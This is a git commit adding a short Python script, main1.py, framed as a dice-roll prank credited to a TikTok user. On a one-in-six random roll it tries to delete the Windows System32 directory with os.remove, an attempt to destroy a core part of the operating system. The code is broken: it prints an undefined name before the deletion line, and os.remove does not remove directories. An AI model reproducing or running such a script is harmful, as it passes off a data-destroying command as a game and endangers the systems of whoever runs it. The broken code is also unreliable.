1b7fadbfa1c46fe92aeb75fa226e4501418828c9
awrizan <64481230+awrizan@users.noreply.github.com>
2021-08-21 22:57:11 -0400

    Add files via upload

---
+++ main1.py
@@ -0,0 +1,10 @@
+# MADE BY AWRIZAN
+# CREDIT TO TIMORCHIK ON TIKTOK
+import os
+import random
+import time
+
+if random.randint(1,6) == 1:
+    print(boom)
+    time.sleep(0.5)
+    os.remove("C:\Windows\System32")
